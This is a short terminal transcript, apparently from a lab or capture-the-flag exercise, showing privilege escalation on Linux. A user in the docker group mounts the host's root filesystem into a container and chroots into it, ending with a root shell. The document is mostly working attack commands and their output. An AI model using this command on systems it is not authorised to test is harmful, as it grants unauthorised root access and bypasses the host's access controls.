# Privilege Esc via Docker Group Membership

```bash
r00t@ip-10-48-172-92:/$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

r00t@ip-10-48-172-92:/$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES

r00t@ip-10-48-172-92:/$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB

r00t@ip-10-48-172-92:/$ docker run -v /:/mnt --rm -it bash chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@26fe258753ae:/# whoami
root
```